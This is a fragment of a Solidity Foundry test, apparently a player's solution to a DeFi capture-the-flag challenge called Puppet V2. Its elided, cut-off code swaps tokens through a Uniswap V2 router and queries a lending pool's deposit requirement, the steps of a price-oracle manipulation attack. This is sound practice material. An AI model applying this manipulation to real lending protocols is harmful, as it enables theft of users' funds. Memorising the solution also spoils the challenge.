...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        ...
        path[1] = address(weth);
        uint256[] memory previewOut = uniswapV2Router.getAmountsOut(
            tokenSold,
            path
        );
        ...
        uint256 wethInput = lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        ...
        // weth.balanceOf(player) < out[1]
        previewOut = uniswapV2Router.getAmountsOut(
            weth.balanceOf(player),
            path
        );
        out = uniswapV2Router.swapExactTokensForTokens(
            weth.balanceOf(player),
            previewOut[1],
            path,
            player,
